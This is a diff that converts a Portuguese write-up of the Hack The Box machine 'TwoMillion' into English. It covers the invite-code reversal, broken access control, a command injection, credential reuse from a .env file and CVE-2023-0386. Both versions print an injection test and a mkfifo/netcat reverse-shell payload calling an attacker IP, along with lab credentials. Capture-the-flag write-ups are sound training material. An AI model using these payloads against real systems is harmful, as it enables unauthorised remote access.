@@ -1,336 +1,167 @@
-# Hack The Box — TwoMillion
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20Exploitation-red)
+TwoMillion is an Easy Linux machine based on the old HTB invite flow. The
+client-side invite logic is reversed to register an account, then a **Broken
+Access Control** flaw on `/api/v1/admin/settings/update` promotes the account to
+admin. An admin-only VPN endpoint is vulnerable to **command injection**,
+yielding a shell as `www-data`. Credentials in a `.env` file allow SSH as
+`admin`, and the **CVE-2023-0386** OverlayFS/FUSE kernel bug escalates to
+**root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| TwoMillion | Easy | Linux | Hack The Box |
 
-| Nome  | Dificuldade | Plataforma    | OS    |
-| ----- | ---------- | ------------ | ----- |
-| TwoMillion | Easy | Hack The Box | Linux |
+## Attack Path
 
----
+1. Web application on port 80 with exposed `/api/v1/` endpoints.
+2. Reverse the client-side invite-code logic to register.
+3. Broken Access Control promotes the account to admin.
+4. Command injection on the admin VPN endpoint gives a shell.
+5. Credentials exposed in a `.env` file allow SSH as `admin`.
+6. Privilege escalation via CVE-2023-0386.
 
-# Superfície de ataque
+## Reconnaissance
 
-```
-1. Web application (porta 80)
-2. API endpoints expostos (/api/v1/)
-3. Lógica de invite code (JS)
-4. Broken Access Control
-5. Command Injection
-6. Credenciais expostas em .env
-7. Privilege Escalation via CVE-2023-0386
-```
+Initial enumeration was performed with **Nmap**.
 
----
-
-# Reconhecimento
-
-A enumeração inicial foi realizada com Nmap.
-
-```
+```bash
 nmap -sC -sV -A -T4 10.129.27.255
 ```
 
-![Nmap Scan](screenshots/nmap.png)
-
-### Descobertas
-
-| Porta | Serviço | Observações |
-| ------ | --------- | ------- |
+| Port | Service | Notes |
+| --- | --- | --- |
 | 22 | SSH | OpenSSH 8.9p1 Ubuntu |
-| 80 | HTTP | nginx, aplicação web em 2million.htb |
+| 80 | HTTP | nginx, app at 2million.htb |
 
----
+## Web Enumeration
 
-# Enumeração Web
-
-A página principal indicava um fluxo de cadastro por convite. Durante a análise da rota `/invite`, foi identificado um arquivo JavaScript relacionado à lógica dos convites.
-
-- Arquivo JavaScript: `inviteapi.min.js`
-- Função relevante: `makeInviteCode()`
-
-O conteúdo estava ofuscado, então foi necessário deobfuscá-lo para entender a lógica da aplicação.
-
-![Deobfuscation](screenshots/deobfuscator.png)
-
-Após a análise, foi possível descobrir o endpoint:
-
-![JS Function](screenshots/js-function.png)
-
-A resposta retornava dados codificados:
-
-![Invite Generate](screenshots/invite-generate.png)
-
-Após decodificação Base64:
-
-![Invite Decode](screenshots/invite-decrypt.png)
-
+The site used an invite-based registration flow. The `/invite` route loaded an
+obfuscated JavaScript file (`inviteapi.min.js`) containing a
+`makeInviteCode()` function. Deobfuscating it revealed the invite API logic.
 
 ```
 /api/v1/invite/how/to/generate
 ```
 
-A resposta retornava uma mensagem codificada. Após decodificação com ROT13, ela indicava um novo endpoint a ser consultado.
+The endpoint returned an encoded message; after ROT13 and Base64 decoding it
+pointed to the code used to register an account.
 
-![CyberChef Decode](screenshots/cyberchef.png)
+## Exploitation — Broken Access Control
 
-O próximo endpoint retornava um valor codificado em **Base64**, que então foi usado no processo de criação de conta.
+After registering and logging in, manual enumeration revealed administrative
+endpoints under `/api/v1/admin`. The `/api/v1/admin/settings/update` endpoint
+allowed changing account properties, including the admin flag, without proper
+authorization. Sending the correct JSON body promoted the account to admin.
 
----
+This is a classic **Broken Access Control** flaw.
 
-# Exploração
+## Command Injection
 
-Com a lógica do invite code compreendida, foi possível gerar um código válido e criar uma conta na plataforma. Após autenticação, a aplicação liberou novas funcionalidades e o acesso às rotas da API.
-
-A análise do comportamento da aplicação mostrou também a funcionalidade de geração do *Connection Pack*, que utilizava o endpoint:
-
-```
-/api/v1/user/vpn/generate
-```
-
----
-
-# Enumeração da API
-
-Após login, a enumeração manual das rotas revelou endpoints administrativos sob `/api/v1/admin`.
-
-Um endpoint interessante revelou toda a estrutura da API:
-
-![API Leak](screenshots/api-leak.png)
-
-Durante testes manuais, foram identificados parâmetros obrigatórios:
-
-![Missing Username](screenshots/missing-username.png)
-![Missing Email](screenshots/missing-mail.png)
-![Missing Admin](screenshots/missing-admin.png)
-
-Também foi necessário ajustar corretamente o Content-Type:
-
-![Invalid Content](screenshots/invalid-content.png)
-
-
-Foi identificado que existiam **3 endpoints** relevantes sob esse caminho, incluindo:
-
-```
-/api/v1/admin/settings/update
-```
-
-Esse endpoint permitia alterar propriedades da conta.
-
-Inicialmente, verificamos o status de admin:
-
-![Admin Check](screenshots/admin-check.png)
-
-Depois, promovemos o usuário:
-
-![Set Admin](screenshots/set-admin.png)
-
-Isso caracteriza uma falha de **Broken Access Control**.
-
-
----
-
-# Command Injection
-
-Com privilégios administrativos, foi possível acessar o endpoint:
-
-```
-/api/v1/admin/vpn/generate
-```
-
-Esse endpoint apresentava uma **Command Injection**, permitindo injetar comandos no parâmetro enviado pela aplicação.
-
-O teste inicial foi feito com:
+With admin privileges, the `/api/v1/admin/vpn/generate` endpoint was reachable
+and vulnerable to **command injection**.
 
 ```
 ninjaa;id;
 ```
 
-![Command Injection](screenshots/command-injection.png)
-
-A resposta confirmou execução remota de comandos no servidor:
-
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Para obter uma shell reversa, foi enviado o seguinte payload:
+A reverse shell payload was injected:
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.233 1337 >/tmp/f
 ```
 
-![Shell Injection Request](screenshots/shell-injection.png)
+## Initial Access (User)
 
----
+A listener received the shell as `www-data`.
 
-# Acesso Inicial
-
-Com um listener aberto na máquina atacante, a exploração resultou em uma shell como `www-data`.
-
-```
+```bash
 nc -nlvp 1337
 ```
 
-![Reverse Shell](screenshots/reverse-shell.png)
+Local enumeration found a `.env` file with database credentials:
 
----
-
-# Credenciais
-
-Durante a enumeração local, foi encontrado um arquivo `.env`, muito comum em aplicações PHP para armazenar variáveis de ambiente.
-
-```
+```bash
 cat .env
 ```
-
-![Env File and Login](screenshots/env-login.png)
-
-As credenciais expostas eram:
 
 ```
 DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
-Com elas, foi possível autenticar via SSH no host como o usuário `admin`.
+These were reused to authenticate over SSH as `admin`:
 
-```
+```bash
 ssh admin@2million.htb
 ```
 
-![SSH Login](screenshots/ssh-login.png)
+The user flag lives at `/home/admin/user.txt`.
 
----
+## Privilege Escalation
 
-# Flag de Usuário
+### Enumeration
 
-Após o acesso como `admin`, foi possível ler a flag de usuário:
+A mail in `admin`'s mailbox referenced upcoming kernel patches for an
+OverlayFS/FUSE vulnerability.
 
-```
-cat user.txt
-```
-
-![User Flag](screenshots/user-flag.png)
-
-```
-5a28a3.....................
-```
-
----
-
-# Enumeração para Escalação de Privilégio
-
-Durante a enumeração do sistema, foi encontrado um email no diretório de emails do usuário `admin`.
-
-```
+```bash
 cat /var/mail/admin
 ```
 
-![Admin Mail](screenshots/mail.png)
+This pointed directly at **CVE-2023-0386**.
 
-O remetente era:
+### Exploiting CVE-2023-0386
 
-```
-ch4p@2million.htb
-```
+The exploit was transferred to the target and run, producing a root shell.
 
-O conteúdo mencionava a necessidade de aplicar correções no sistema operacional devido a vulnerabilidades recentes do kernel Linux, incluindo uma falha em OverlayFS / FUSE.
-
-Isso direcionou a investigação para a vulnerabilidade:
-
-```
-CVE-2023-0386
-```
-
----
-
-# Escalação de Privilégio
-
-A exploração da **CVE-2023-0386** foi realizada transferindo um exploit para a máquina-alvo.
-
-Na máquina atacante:
-
-```
+```bash
+# attacker
 python3 -m http.server 8000
 ```
 
-![Exploit Transfer](screenshots/cve-to-host.png)
+The root flag lives at `/root/root.txt`.
 
-Na máquina alvo, o exploit foi baixado e executado. A exploração resultou em shell root.
+## Vulnerability Analysis
 
-![Privilege Escalation](screenshots/priv-esc.png)
+**Sensitive logic exposed in JavaScript** — the invite-generation logic was
+reachable client-side (even if obfuscated), allowing the registration flow to be
+reconstructed. Fix: keep security-sensitive logic server-side and never rely on
+client-side obfuscation.
 
-Após sucesso, a sessão passou a ter privilégios de superusuário.
+**Broken Access Control** — `/api/v1/admin/settings/update` allowed promoting a
+regular account to admin without authorization. Fix: enforce server-side
+authorization checks on every privileged action.
 
----
+**Command injection** — `/api/v1/admin/vpn/generate` accepted unsanitized input,
+giving RCE as `www-data`. Fix: avoid shelling out with user input; use safe APIs
+and strict input validation.
 
-# Flag Root
+**Credential exposure** — a `.env` file held reusable credentials valid for SSH.
+Fix: restrict permissions on environment files and avoid credential reuse.
 
-Com acesso root, bastou ler a flag final:
+**Kernel vulnerability (CVE-2023-0386)** — an OverlayFS/FUSE bug allowed
+escalation from `admin` to root. Fix: keep the kernel patched.
 
-```
-cat /root/root.txt
-```
-
-![Root Flag](screenshots/root-flag.png)
-
-```
-3d2e9a.....................
-```
-
----
-
-# Vulnerabilidades Identificadas
-
-### 1. Exposição de lógica sensível em JavaScript
-A lógica para geração de convites estava acessível ao cliente, ainda que ofuscada. Isso permitiu reconstruir o fluxo de cadastro.
-
-### 2. Broken Access Control
-O endpoint `/api/v1/admin/settings/update` permitia promover uma conta comum para administrador sem validação adequada.
-
-### 3. Command Injection
-O endpoint `/api/v1/admin/vpn/generate` aceitava entrada não sanitizada, resultando em execução arbitrária de comandos no servidor.
-
-### 4. Exposição de credenciais
-O arquivo `.env` continha credenciais sensíveis reutilizáveis para acesso SSH.
-
-### 5. Kernel Vulnerability — CVE-2023-0386
-Uma vulnerabilidade no OverlayFS/FUSE permitiu escalar privilégios de `admin` para `root`.
-
----
-
-# Ferramentas Utilizadas
+## Tools Used
 
 - Nmap
 - Burp Suite
 - CyberChef
 - Netcat
 - SSH
-- Python HTTP Server
+- Python HTTP server
 
----
+## Key Takeaways
 
-# Principais Aprendizados
-
-- JavaScript ofuscado ainda pode expor fluxos críticos da aplicação.
-- APIs mal protegidas frequentemente escondem falhas graves de autorização.
-- Command Injection continua sendo uma vulnerabilidade extremamente impactante.
-- Arquivos `.env` expostos representam alto risco operacional.
-- Emails e artefatos internos podem fornecer pistas valiosas para privilege escalation.
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
-
-
----
-
+- Obfuscated JavaScript can still expose critical application flows.
+- Poorly protected APIs often hide serious authorization flaws.
+- Command injection remains extremely impactful.
+- Exposed `.env` files are a high operational risk.
+- Internal artifacts like mail can provide valuable privesc leads.
